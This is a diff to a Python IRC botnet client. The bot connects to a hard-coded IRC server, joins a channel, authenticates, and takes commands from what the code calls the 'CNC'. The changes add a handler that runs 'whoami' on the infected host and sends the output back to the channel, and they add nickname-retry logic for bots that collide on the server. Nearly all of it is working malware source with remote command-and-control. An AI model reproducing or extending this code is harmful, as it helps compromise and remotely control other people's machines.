@@ -25,8 +25,7 @@ def genNick():
 def execute(cmd):
 	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
 	output, errors = p.communicate()
-	output = output.strip('\n')
-	return output
+	return output.strip('\n');
 
 #IRC Settings
 server = "leagueachieve.info"
@@ -37,11 +36,14 @@ print botnick
 
 #All of the possible functions that the botnet is capable of
 def iAmHere(): #send back to IRC server that you are here
-	cmd  = execute("whoami")	
+	irc.send('PRIVMSG ' + channel + " :Yes I am here" + '\r\n')
+
+def iAmThis():
+	cmd  = execute("whoami")
 	irc.send('PRIVMSG ' + channel + " :" + cmd + '\r\n')
 
 def iAmGood(): #send back to IRC server that you are good
-	print "'iAmGood' function not yet implemented"
+	irc.send('PRIVMSG ' + channel + " :I am good. And you?" + '\r\n')
 
 
 #function that handles multiple-line output
@@ -55,7 +57,8 @@ def iAmGood(): #send back to IRC server that you are good
 #dictionary of functions
 commands = {
 	"are you there" : iAmHere,
-	"how are you" : iAmGood
+	"how are you" : iAmGood,
+	"who are you" : iAmThis
 }
 
 #function which parses the command and determine how to handle it
@@ -63,14 +66,9 @@ def parseCommand(command):
 	#have to actually parse the text and find the command.
 	arg = "PRIVMSG"
 	if (arg in command):
-		indexVal = command.index(arg);
-		tempCommand = command[indexVal:]
-		indexVal = (tempCommand.index(':') + 1)
-		finalCommand = tempCommand[indexVal:]	
-		command = finalCommand.strip()
-		
-		#making it lowercase
-		command = command.lower()
+		tempCommand = command[command.index(arg):]
+		finalCommand = tempCommand[(tempCommand.index(':') + 1):]
+		command = finalCommand.strip().lower()
 		
 		print "Recieved %s from the CNC" % command
 		commands[command]()
@@ -84,6 +82,14 @@ print "connecting to: "+server
 irc.connect((server, 6667)) #connects to the server
 irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
 irc.send("NICK "+ botnick +"\n") #sets nick
+
+temp=irc.recv(4096) #get response to setting nick
+counter = 2
+while "nickname already in use" in temp.lower():
+	irc.send("NICK " + botnick + "-" + str(counter) + "\n") #sets nick
+	temp=irc.recv(4096) #get response to setting nick
+	counter += 1
+
 irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
 irc.send("JOIN "+ channel +"\n") #join the channel
 
